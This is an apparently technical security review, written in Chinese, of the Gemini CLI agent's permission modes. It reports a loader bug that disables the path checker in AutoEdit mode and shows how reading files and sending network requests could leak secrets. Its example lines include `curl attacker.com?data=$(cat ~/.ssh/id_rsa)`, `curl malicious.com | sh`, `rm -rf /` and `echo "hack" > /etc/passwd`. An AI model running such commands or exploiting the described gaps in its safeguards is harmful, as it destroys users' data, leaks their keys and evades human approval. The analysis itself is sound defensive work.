# Gemini CLI 深度实现分析与五种模式对比

## 1. AllowedPathChecker 深度逆向分析

### 1.1 代码实现逻辑 (`Code Writing`)
`AllowedPathChecker` (`packages/core/src/safety/built-in.ts`) 的核心逻辑是为了防止路径遍历攻击（Path Traversal）和符号链接逃逸（Symlink Escape）。

*   **输入**: 接收工具调用的参数（如 `file_path`）。
*   **解析 (`safelyResolvePath`)**:
    *   使用 `path.resolve` 将相对路径转为绝对路径。
    *   **关键防护**: 使用 `fs.realpathSync` 逐级解析父目录。
        *   这是一个非常健壮的实现。如果攻击者试图通过 `/workspace/symlink_to_root/etc/passwd` 访问文件，`realpathSync` 会将其解析为 `/etc/passwd`。
    *   **比对**: 将解析后的规范路径（Canonical Path）与允许的目录列表（`cwd` + `workspaces`）进行前缀比对。

**结论**: `AllowedPathChecker` 的代码编写本身是安全且健壮的。

### 1.2 数据调用链 (`Data Chain`)
然而，在数据流转链路上存在严重的**断裂（Disconnected）**。

1.  **配置层 (TOML)**:
    *   `write.toml` 使用**嵌套语法** `[rule.safety_checker]` 将检查器绑定到 `write_file` 规则上。
2.  **加载层 (Loader)**:
    *   `toml-loader.ts` 使用 Zod Schema 进行验证和转换。
    *   **断裂点**: `PolicyRuleSchema` 定义中**缺少 `safety_checker` 字段**。
    *   **后果**: 由于 Zod 默认行为是剔除未知字段（Strip），导致 `write.toml` 中定义的嵌套检查器配置在加载阶段被**静默丢弃**。
3.  **引擎层 (PolicyEngine)**:
    *   `PolicyEngine` 初始化时，仅加载了顶层定义的 `checkers`。
    *   当 `check()` 方法运行时，它遍历 `this.checkers`。
    *   由于加载层的数据丢失，`write_file` 对应的 `AllowedPathChecker` 实际上从未被注册到引擎中。

**最终结论**: 尽管 `AllowedPathChecker` 代码逻辑正确，但由于加载器的 Schema 定义缺陷，它在 `AutoEdit` 模式下**并未生效**。

---

## 2. 五种模式的权限与原理深度对比

用户提到的 "Shell Mode" 在代码中并非 `ApprovalMode` 枚举的一部分，但在逻辑上可视为对 Shell 工具的特殊处理策略。以下是基于源码的深度对比：

| 特性 | Plan Mode | Default Mode | AutoEdit Mode | Yolo Mode | Shell Execution* |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **定义文件** | `plan.toml` | `read-only.toml`, `write.toml` | `write.toml` | `yolo.toml` | (各模式中的 `run_shell_command`) |
| **核心逻辑** | **白名单 + 正则** | **Ask User (交互式)** | **Auto Allow (带缺陷)** | **Allow All** | **AST 解析 + 逐条审查** |
| **文件读取** | ✅ 允许 (`read_file`, `glob` 等) | ✅ 允许 (无路径限制!) | ✅ 允许 | ✅ 允许 | 🚫 视 Shell 命令而定 |
| **文件写入** | ⚠️ **受限允许**<br>仅限 `.gemini/tmp/...` <br>(通过 `argsPattern` 正则实现) | 👤 **询问用户**<br>(安全) | ⚠️ **自动允许**<br>❌ 路径检查器失效<br>(可写任意文件) | ✅ 允许<br>(无限制) | 🚫 视 Shell 命令而定 |
| **Shell命令** | ⛔ **禁止**<br>(Deny All 策略) | 👤 **询问用户** | 👤 **询问用户**<br>(未覆盖默认规则) | ✅ **自动允许** | N/A |
| **路径限制** | **强校验** (Regex) | **无** (依赖用户人工审核) | **失效** (因Bug) | **无** | **无** |

### 2.1 关键差异解析

1.  **Plan Mode 的安全性最高**:
    *   它**不依赖** `AllowedPathChecker`。
    *   它使用 `argsPattern` 正则表达式直接在策略规则中硬编码了允许写入的路径（`.gemini/tmp/...`）。
    *   因此，即使 `toml-loader` 存在 Bug，Plan Mode 依然是安全的。

2.  **AutoEdit Mode 存在隐患**:
    *   设计初衷是利用 `AllowedPathChecker` 限制写入范围在工作区。
    *   由于数据链断裂，目前变成了“允许写入系统任何位置”（只要进程有权限）。

3.  **Default Mode 的安全性依赖用户**:
    *   它没有配置路径检查器。
    *   对于 `read_file`，它是默认允许的，且**没有路径限制**。Agent 可以读取 `/etc/passwd` (如果操作系统允许)，CLI 不会拦截，完全依赖用户对 Agent 输出的审查。

4.  **Shell Execution (所谓 "Shell Mode")**:
    *   **AST 解析**: 无论在哪种模式下（除 Yolo），Shell 命令都会被 `web-tree-sitter` 拆解。
    *   **权限继承**: 拆解后的命令会回落到当前模式的策略。
    *   在 Default/AutoEdit 下，Shell 命令默认为 `ASK_USER`。
    *   **注意**: Shell 命令**不经过** `AllowedPathChecker`。即使修复了 Bug，Shell 命令（如 `echo "hack" > /etc/passwd`）的路径安全完全依赖于用户的“批准/拒绝”决策。

---

## 3. 修复建议

为了使 `AutoEdit` 模式达到设计预期的安全性，必须修复 `packages/core/src/policy/toml-loader.ts` 中的 Schema 定义：

```typescript
// 需要在 PolicyRuleSchema 中添加 safety_checker 字段
const PolicyRuleSchema = z.object({
  // ... 现有字段
  
  // 新增字段，允许嵌套定义检查器
  safety_checker: SafetyCheckerRuleSchema.omit({ toolName: true, modes: true }).optional(),
});
```
同时需要修改加载逻辑，将嵌套的检查器提取并合并到主检查器列表中。

---

## 4. ToolName 与 命令及策略对应关系详解

为了更清晰地理解系统如何控制具体操作，下表列出了核心 `toolName`、其对应的实际功能，以及在不同策略模式下的默认行为。

### 4.1 核心工具列表与系统命令映射

下表展示了 Gemini CLI 内部工具 (`toolName`) 如何映射到底层操作系统调用或 Shell 命令。了解这一点对于理解其能力边界至关重要。

| toolName | 功能描述 | 底层实现原理 (Node.js API / Shell) | 对应的 Linux/Powershell 命令 (近似) |
| :--- | :--- | :--- | :--- |
| `read_file` | 读取文件 | **Node.js API**: `fs.readFile` (通过 `FileSystemService`) | `cat <file>`, `Get-Content <file>` |
| `write_file` | 写入文件 | **Node.js API**: `fs.writeFile` | `echo "..." > <file>`, `Set-Content <file>` |
| `list_directory` | 列出目录 | **Node.js API**: `fs.readdir` + `fs.stat` | `ls -la`, `Get-ChildItem` |
| `search_file_content` | 搜索内容 | **Hybrid**: 优先尝试 `git grep` (Spawn Process)，失败则尝试 `grep`，最后回退到 JS `glob` + `fs.readFile` | `git grep -nE`, `grep -rnE`, `Select-String` |
| `glob` | 文件查找 | **Node.js API**: 使用 `glob` 库 (基于 `fs.readdir`) | `find . -name "..."`, `Get-ChildItem -Recurse -Filter` |
| `replace` | 文本替换 | **Pure JS**: 内存中字符串处理 (`safeLiteralReplace`) + `fs.writeFile` | `sed -i`, `perl -pi`, `(Get-Content) | ForEach-Object { $_ -replace } | Set-Content` |
| `run_shell_command` | 执行命令 | **Node.js API**: `child_process.spawn` (Shell=True) | 直接执行任意 Shell 命令 (如 `npm test`, `git commit`) |
| `web_fetch` | 网页抓取 | **Node.js API**: `fetch` API 或 Headless Browser | `curl`, `wget`, `Invoke-WebRequest` |

### 4.2 策略矩阵 (Policy Matrix)

**图例说明**:
*   ✅ **Allow**: 自动允许，无需用户确认。
*   👤 **Ask**: 拦截并询问用户，用户批准后执行。
*   ⛔ **Deny**: 自动拒绝，不询问用户。
*   ⚠️ **Allow (Limited)**: 自动允许，但有参数限制（如路径正则）。
*   ⚠️ **Allow (Buggy)**: 源码意图是有限制，但因 Bug 导致无限制。

| toolName | Default Mode | AutoEdit Mode | Plan Mode | Yolo Mode |
| :--- | :--- | :--- | :--- | :--- |
| `read_file` | ✅ Allow | ✅ Allow | ✅ Allow | ✅ Allow |
| `glob` | ✅ Allow | ✅ Allow | ✅ Allow | ✅ Allow |
| `list_directory` | ✅ Allow | ✅ Allow | ✅ Allow | ✅ Allow |
| `search_file_content`| ✅ Allow | ✅ Allow | ✅ Allow | ✅ Allow |
| `google_web_search` | ✅ Allow | ✅ Allow | ✅ Allow | ✅ Allow |
| `write_file` | 👤 Ask | ⚠️ Allow (Buggy)* | ⚠️ Allow (Limited)** | ✅ Allow |
| `replace` | 👤 Ask | ⚠️ Allow (Buggy)* | ⛔ Deny | ✅ Allow |
| `run_shell_command` | 👤 Ask | 👤 Ask | ⛔ Deny | ✅ Allow |
| `save_memory` | 👤 Ask | 👤 Ask | ⛔ Deny | ✅ Allow |
| `web_fetch` | 👤 Ask | 👤 Ask | ⛔ Deny | ✅ Allow |
| `activate_skill` | 👤 Ask | 👤 Ask | ⛔ Deny | ✅ Allow |

### 4.3 备注说明

1.  **`write_file` / `replace` in AutoEdit Mode**:
    *   **理论行为**: 允许写入，但必须通过 `AllowedPathChecker` 验证路径在工作区内。
    *   **实际行为**: 由于 Schema Bug，路径检查器未加载，实际上变成了**无限制写入**。

2.  **`write_file` in Plan Mode**:
    *   **限制规则**: 仅允许 `args.file_path` 匹配正则表达式 `".gemini/tmp/.../plans/..."`。
    *   **安全性**: 非常高，因为这是硬编码在 TOML 规则中的，不依赖外部检查器。

3.  **Shell Commands**:
    *   `run_shell_command` 比较特殊，因为它执行的是任意字符串。
    *   系统会先尝试解析 Shell 命令。如果解析成功，会对每个子命令再次进行策略检查。
    *   但在 Default/AutoEdit 模式下，针对 `run_shell_command` 本身的规则是 `ask_user`，所以无论执行什么命令，只要它被识别为 Shell 调用，通常都会触发询问。

---

## 5. Shell 命令执行：深度对比与权限分析

本节深入分析不同模式下 Shell 命令的执行能力 (`run_shell_command`)，特别是**能否执行 Shell** 以及**权限范围**。

### 5.1 Shell 执行能力矩阵

| 模式 | 能否执行 Shell? | 权限策略 | 命令范围限制 | 重定向限制 (`>`) |
| :--- | :--- | :--- | :--- | :--- |
| **Plan Mode** | ⛔ **完全禁止** | Deny All | 任何命令均被拦截 | N/A |
| **Default Mode** | 👤 **需询问** | Ask User | 无白名单，全靠用户审核 | 👤 需询问 (Ask) |
| **AutoEdit Mode** | 👤 **需询问** | Ask User | 无白名单，全靠用户审核 | 👤 需询问 (Ask) |
| **Yolo Mode** | ✅ **自动执行** | Allow | 无限制 | ✅ 允许 (Allow) |

### 5.2 核心机制分析

1.  **AST 解析与递归检查**:
    *   当 `run_shell_command` 被调用时，`PolicyEngine` 会使用 `web-tree-sitter` 将复杂的命令字符串（如 `git add . && git commit -m "msg"`）拆解为独立的子命令 (`git add .`, `git commit ...`)。
    *   **递归验证**: 每个子命令都会被当作一个新的 "Tool Call" 重新输入到策略引擎中进行检查。
    *   **短板效应**: 如果拆解出的任何一个子命令被拒绝 (Deny)，整个 Shell 命令链就会被拒绝；如果有任何一个需要询问 (Ask)，整个命令链就需要询问。

2.  **Plan Mode 的绝对封锁**:
    *   `plan.toml` 定义了一个优先级为 20 的全局 `deny` 规则。
    *   虽然它显式允许了 `read_file` 等只读工具，但**没有允许** `run_shell_command`。
    *   因此，Agent 在 Plan Mode 下**完全无法执行任何 Shell 命令**，甚至是 `ls` 或 `echo` 都不行。

3.  **Default 与 AutoEdit 的行为一致性**:
    *   许多用户误以为 AutoEdit 模式会自动允许 Shell 命令。
    *   **源码事实**: `write.toml` 仅为 `write_file` 和 `replace` 添加了 `autoEdit` 模式的 Allow 规则。
    *   对于 `run_shell_command`，`write.toml` 中定义的规则是 `ask_user` (优先级 10)。
    *   **结果**: 在 AutoEdit 模式下，Agent 修改代码是自动的，但如果要运行测试 (`npm test`) 或提交代码 (`git commit`)，CLI **依然会暂停并询问用户**。

4.  **Yolo Mode 的无限权限**:
    *   `yolo.toml` 定义了优先级 999 的全局 Allow 规则。
    *   `allow_redirection = true`: 这是唯一允许 Shell 重定向（如 `echo "hack" > /etc/passwd`）不降级为 "Ask User" 的模式。
    *   在其他模式下，即使某个具体命令被允许了，一旦检测到重定向符号 (`>`, `>>`, `|`)，引擎会自动将决策降级为 `ASK_USER` 以防止文件覆盖风险。

### 5.3 权限范围与操作系统交互

*   **进程权限**: Gemini CLI 启动的 Shell 子进程继承了父进程（即用户终端）的所有权限。
*   **无沙箱**: `run_shell_command` **没有** `AllowedPathChecker` 的保护。
*   **风险示例**:
    *   在 **Yolo Mode** 下，Agent 可以执行 `rm -rf /` (如果用户有权限) 或 `curl malicious.com | sh`。
    *   在 **Default/AutoEdit Mode** 下，Agent 可以**提议**执行上述命令，安全完全依赖于用户在交互提示中选择 "Reject"。

---

## 6. 高危操作场景与模式安全性深度评估

本节针对用户最关心的三个高危场景进行逐一评估：
1.  **跨工作区删除/编辑文件**
2.  **删除/编辑系统级目录文件**
3.  **带外攻击 (OOB)**: 携带敏感文件内容向外发送请求 (curl/ping)

### 6.1 场景一：跨工作区/系统级文件编辑与删除
**定义**: Agent 试图修改或删除位于当前工作区之外的文件（如 `/etc/hosts`, `C:\Windows\System32\drivers\etc\hosts`）。

| 模式 | Tool: `write_file` / `replace` | Tool: `run_shell_command` (e.g. `rm`, `del`) |
| :--- | :--- | :--- |
| **Plan Mode** | ⛔ **安全 (禁止)**<br>正则限制仅能写临时计划文件。 | ⛔ **安全 (禁止)**<br>Shell 被完全禁用。 |
| **Default Mode** | 👤 **依赖人工**<br>策略为 `Ask User`。CLI 会提示路径，需用户肉眼识别并拦截。 | 👤 **依赖人工**<br>策略为 `Ask User`。CLI 会显示 `rm /etc/passwd`，需用户拦截。 |
| **AutoEdit Mode** | ❌ **极高风险 (Bug)**<br>因 `safety_checker` 失效，Agent 可**自动**修改系统任意文件，无需确认。 | 👤 **依赖人工**<br>Shell 依然是 `Ask User`。但若 Agent 使用 `fs.unlink` (如果有此工具) 则可能绕过。 |
| **Yolo Mode** | ❌ **极高风险**<br>自动允许。Agent 可随意删除系统文件。 | ❌ **极高风险**<br>自动允许 `rm -rf /`。 |

**关键结论**:
*   **AutoEdit Mode 目前最危险**，因为它给了用户“受限自动”的错觉，但实际上对文件写入是**全放开**的。
*   Default Mode 虽然没有自动拦截，但每一条高危操作都会弹窗，只要用户不盲目点 Yes 就是安全的。

### 6.2 场景二：带外攻击 (OOB / Data Exfiltration)
**定义**: Agent 读取敏感文件（如 SSH 密钥），然后通过网络命令将其发送出去（如 `curl attacker.com?data=$(cat ~/.ssh/id_rsa)`）。

| 模式 | 读取敏感文件 (`read_file`) | 发送网络请求 (`curl`, `web_fetch`) | 综合风险 |
| :--- | :--- | :--- | :--- |
| **Plan Mode** | ✅ 允许 | ⛔ **禁止**<br>`web_fetch` 被拒，Shell 被拒。 | 🟢 **低**<br>能读但发不出去（除非通过 DNS 隧道等高级手段，但 Shell 被禁限制了能力）。 |
| **Default Mode** | ✅ 允许<br>(无路径限制) | 👤 **需询问**<br>`web_fetch` 和 Shell 均需确认。 | 🟡 **中**<br>Agent 可以读取私钥。如果用户批准了后续的 `curl` 请求，密钥就会泄露。 |
| **AutoEdit Mode**| ✅ 允许 | 👤 **需询问**<br>同 Default Mode。 | 🟡 **中**<br>同 Default Mode。 |
| **Yolo Mode** | ✅ 允许 | ✅ **自动允许** | 🔴 **极高**<br>Agent 可以瞬间读取私钥并发送出去，全程无感知。 |

**关键结论**:
*   **读取权限过于宽松**: 除了 Plan Mode 外，所有模式默认都允许 `read_file` 读取任意路径（只要操作系统权限允许）。这意味着 Agent **可以**读取 `~/.ssh/id_rsa`。
*   **防泄露防线**: Default/AutoEdit 依赖于对网络请求 (`web_fetch` / `curl`) 的拦截。如果用户习惯性批准网络请求，敏感数据极易泄露。

### 6.3 总结：五种模式的防御能力评分

| 攻击向量 | Plan Mode | Default Mode | AutoEdit Mode | Yolo Mode |
| :--- | :--- | :--- | :--- | :--- |
| **任意文件写** | 🛡️ **防御** (正则白名单) | 👁️ **人工** (询问) | 💀 **失守** (因Bug) | 💀 **失守** (设计如此) |
| **任意文件删** | 🛡️ **防御** (禁止Shell) | 👁️ **人工** (询问) | 👁️ **人工** (询问Shell) | 💀 **失守** |
| **数据外泄** | 🛡️ **防御** (禁止网络) | 👁️ **人工** (询问网络) | 👁️ **人工** (询问网络) | 💀 **失守** |
| **恶意命令** | 🛡️ **防御** (禁止Shell) | 👁️ **人工** (询问) | 👁️ **人工** (询问) | 💀 **失守** |

**最终安全建议**:
1.  **绝不使用 Yolo Mode** 处理敏感项目。
2.  **暂停使用 AutoEdit Mode**，直到官方修复 `safety_checker` 加载 Bug。
3.  **Default Mode 是最平衡的选择**，但必须仔细阅读每一个 `Ask User` 的弹窗内容，特别是涉及系统路径的文件操作和不明网络请求。
